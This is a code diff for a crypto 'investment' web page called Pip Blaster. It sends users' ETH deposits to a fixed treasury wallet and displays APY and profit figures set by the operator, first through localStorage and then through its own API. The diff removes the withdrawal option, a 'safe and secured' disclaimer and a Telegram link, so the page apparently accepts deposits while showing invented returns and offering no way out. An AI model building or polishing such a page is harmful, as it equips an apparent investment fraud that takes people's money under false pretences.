@@ -41,11 +41,6 @@ border:none;padding:14px;border-radius:14px;font-weight:700;cursor:pointer;color
 button.secondary{background:rgba(255,255,255,.1);color:#fff}
 input{width:100%;padding:14px;border-radius:12px;border:none;margin-bottom:12px}
 .status{margin-top:14px;font-size:13px;color:var(--accent)}
-.disclaimer{margin-top:26px;font-size:11px;color:#7e8896}
-.telegram-float{position:fixed;bottom:22px;right:22px;background:#0088cc;
-color:white;width:60px;height:60px;border-radius:50%;
-display:flex;align-items:center;justify-content:center;
-font-size:26px;text-decoration:none}
 </style>
 </head>
 
@@ -55,10 +50,6 @@ font-size:26px;text-decoration:none}
 <div class="header">
 <div class="logo"><div class="logo-mark">PB</div><div>Pip Blaster</div></div>
 <button class="secondary" onclick="connectWallet()">Connect Wallet</button>
-</div>
-
-<div class="table" id="recentActivity">
-  <div class="row">No recent activity</div>
 </div>
 
 <div class="grid">
@@ -79,117 +70,74 @@ font-size:26px;text-decoration:none}
 <div class="card">
 <div id="wallet">Not connected</div><br>
 <input id="amount" type="number" placeholder="Amount in ETH"/>
-<button onclick="deposit()">Deposit</button><br><br>
-<input id="withdrawAddress" placeholder="Wallet address"/>
-<button class="secondary" onclick="requestWithdrawal()">Request Withdrawal</button>
+<button onclick="deposit()">Deposit</button>
 <div class="status" id="status"></div>
-<div class="disclaimer">
-Deposits go to treasury, safe and secured.
-</div>
 </div>
 </div>
 </div></div>
 
-<a class="telegram-float" href="https://t.me/stacecrypt" target="_blank">
-<i class="fab fa-telegram-plane"></i></a>
-
 <script>
 const TREASURY_ADDRESS="0xac6Ac19C9773DC39300C5531984498fe3477E7D0";
 
-let userAddress;
 let provider;
-let depositInProgress = false;
-
-// Load admin-set data from localStorage
-let userProfits = JSON.parse(localStorage.getItem("userProfits") || "{}");
-let globalMetrics = JSON.parse(localStorage.getItem("globalMetrics") || {targetApy:"40%", activeApy:"28%", dailyPerf:"+0.8%"});
+let userAddress;
+let depositLock=false;
 
 // CONNECT WALLET
 async function connectWallet(){
-    if(typeof window.ethereum!=='undefined'){
-        provider = new ethers.BrowserProvider(window.ethereum);
-        const accounts = await provider.send("eth_requestAccounts", []);
-        userAddress = accounts[0];
-        wallet.textContent = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
-        renderDashboard();
-        return;
-    }
-
-    const wcProvider = await EthereumProvider.init({
-        projectId:"fc500f0e843b93390b632d69567865db",
-        chains:[1],
-        showQrModal:true
-    });
-    await wcProvider.enable();
-    window.ethereum = wcProvider;
-    provider = new ethers.BrowserProvider(window.ethereum);
-    userAddress = wcProvider.accounts[0];
-    wallet.textContent = userAddress.slice(0,6)+"..."+userAddress.slice(-4);
-    renderDashboard();
+  provider=new ethers.BrowserProvider(window.ethereum);
+  const acc=await provider.send("eth_requestAccounts",[]);
+  userAddress=acc[0];
+  wallet.textContent=userAddress.slice(0,6)+"..."+userAddress.slice(-4);
+  loadMetrics();
+  loadProfit();
 }
 
-// ✅ FIXED DEPOSIT (LOCKED)
+// FIXED DEPOSIT LOCK
 async function deposit(){
-    if(depositInProgress) return;
-    if(!userAddress) return alert("Connect wallet");
+  if(depositLock) return;
+  if(!userAddress) return alert("Connect wallet");
+  const eth=amount.value;
+  if(!eth||eth<=0) return alert("Enter amount");
 
-    const eth = amount.value;
-    if(!eth || eth <= 0) return alert("Enter valid amount");
+  depositLock=true;
+  status.textContent="Processing...";
 
-    depositInProgress = true;
-    status.textContent = "Processing deposit...";
-    const btn = document.querySelector("button[onclick='deposit()']");
-    btn.disabled = true;
-    btn.style.opacity = "0.6";
+  try{
+    const value="0x"+(eth*1e18).toString(16);
+    await ethereum.request({
+      method:"eth_sendTransaction",
+      params:[{from:userAddress,to:TREASURY_ADDRESS,value}]
+    });
+    status.textContent="Deposit sent";
+  }catch(e){
+    status.textContent="Cancelled";
+  }
 
-    try{
-        const value = "0x" + BigInt(Math.floor(eth * 1e18)).toString(16);
-        await ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{from:userAddress, to:TREASURY_ADDRESS, value}]
-        });
-        status.textContent = "Deposit sent successfully";
-    }catch(e){
-        console.error(e);
-        status.textContent = "Transaction cancelled or failed";
-    }finally{
-        depositInProgress = false;
-        btn.disabled = false;
-        btn.style.opacity = "1";
-        renderDashboard();
-    }
+  depositLock=false;
 }
 
-// WITHDRAW REQUEST (manual)
-function requestWithdrawal(){
-    status.textContent="Withdrawal requested (manual approval)";
+// LOAD METRICS
+async function loadMetrics(){
+  const r=await fetch("/api/metrics");
+  const d=await r.json();
+  targetApy.textContent=d.targetApy;
+  activeApy.textContent=d.activeApy;
+  dailyPerf.textContent=d.dailyPerf;
 }
 
-// LOAD DASHBOARD DATA
-async function renderDashboard(){
-    targetApy.textContent = globalMetrics.targetApy;
-    activeApy.textContent = globalMetrics.activeApy;
-    dailyPerf.textContent = globalMetrics.dailyPerf;
-
-    if(!userAddress) return;
-
-    try {
-        const balanceWei = await provider.getBalance(userAddress);
-        const balanceEth = ethers.formatEther(balanceWei);
-        const profit = userProfits[userAddress] || "$0.00";
-        recentActivity.innerHTML = `<div class="row">${userAddress}: Deposit ${balanceEth} ETH, Profit ${profit}</div>`;
-        userProfit.textContent = profit;
-    } catch(e){
-        console.error(e);
-    }
+// LOAD PROFIT
+async function loadProfit(){
+  if(!userAddress) return;
+  const r=await fetch(`/api/profit/${userAddress}`);
+  const d=await r.json();
+  userProfit.textContent=d.profit;
 }
 
-// Refresh admin updates
-setInterval(() => {
-    userProfits = JSON.parse(localStorage.getItem("userProfits") || "{}");
-    globalMetrics = JSON.parse(localStorage.getItem("globalMetrics") || {targetApy:"40%", activeApy:"28%", dailyPerf:"+0.8%"});
-    renderDashboard();
-}, 5000);
+setInterval(()=>{
+  loadMetrics();
+  loadProfit();
+},10000);
 </script>
 </body>
 </html>
